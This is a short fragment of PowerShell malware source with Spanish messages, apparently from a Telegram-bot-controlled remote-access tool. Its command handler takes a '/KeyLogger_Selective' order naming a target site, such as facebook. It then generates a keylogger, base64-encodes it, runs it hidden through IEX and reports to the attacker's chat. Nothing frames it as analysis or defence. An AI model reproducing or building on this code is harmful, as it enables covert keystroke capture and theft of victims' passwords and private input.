...
function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
 ...
 if ($comando -eq "/KeyLogger_Selective") {$texto = "Activa un KeyLogger de manera selectiva.`nEjemplo: /KeyLogger_Selective facebook"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = (crea_keylogger -extrae $comando);$code = code_a_base64 -code $code; $code = "start-process powershell.exe -ArgumentList -WindowStyle Hidden -E $code"; IEX $code;  $texto = "Lanzado Keylogger_Selective" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
